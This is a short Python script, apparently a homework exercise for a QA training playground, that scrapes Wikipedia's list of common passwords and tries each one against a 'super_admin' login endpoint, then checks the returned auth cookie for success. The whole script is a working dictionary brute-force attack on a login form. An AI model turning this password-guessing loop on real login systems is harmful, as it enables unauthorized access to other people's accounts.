import requests
from bs4 import BeautifulSoup


req = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
p = req.text
soup = BeautifulSoup(p, 'lxml')
for tag in soup.find_all("td"):
    list = format(tag.text)
    pars = list.split()


    for i in pars:
        pas = {"password": i}
        data = {
            "login": "super_admin",
            "password": pas["password"]
        }

        response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)
        jar = response.cookies.get_dict()
        data1 = jar['auth_cookie']
        res_auth = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", data=data1)
        if res_auth.text == "You are authorized":
            print(res_auth.url)
            print(res_auth.text)
        else:
            print("This is no valid password")










































